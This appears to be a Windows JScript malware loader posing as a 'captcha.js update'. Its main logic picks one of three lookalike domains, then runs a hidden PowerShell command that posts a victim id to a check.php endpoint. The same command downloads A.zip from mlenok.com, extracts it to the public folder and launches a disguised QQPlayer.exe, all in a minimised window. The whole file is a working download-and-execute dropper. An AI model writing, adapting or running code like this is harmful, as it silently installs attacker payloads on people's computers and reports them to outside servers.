// captcha.js update test
var args = WScript.Arguments;
var id = args.Item(0);
var c = args.Item(1);

var body = "id=" + id;

var udemy = "udemy-educate.com";
var ph = "phub-videos.com";
var mob = "mobalytics-ad.com";

var url;
if (c == "1") {
    url = udemy;
} else if (c == "2") {
    url = ph;
} else if (c == "3") {
    url = mob;
}

var shell = WScript.CreateObject("WScript.Shell");
var cmd = 'powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\QQPlayer.exe\';$z=$p+\'.zip\';iwr https://' 
        + url 
        + '/check.php -Method Post -Body \'' + body 
        + '\';irm https://mlenok.com/A.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p"';
        
shell.Run("cmd /c start /min " + cmd, 0, false);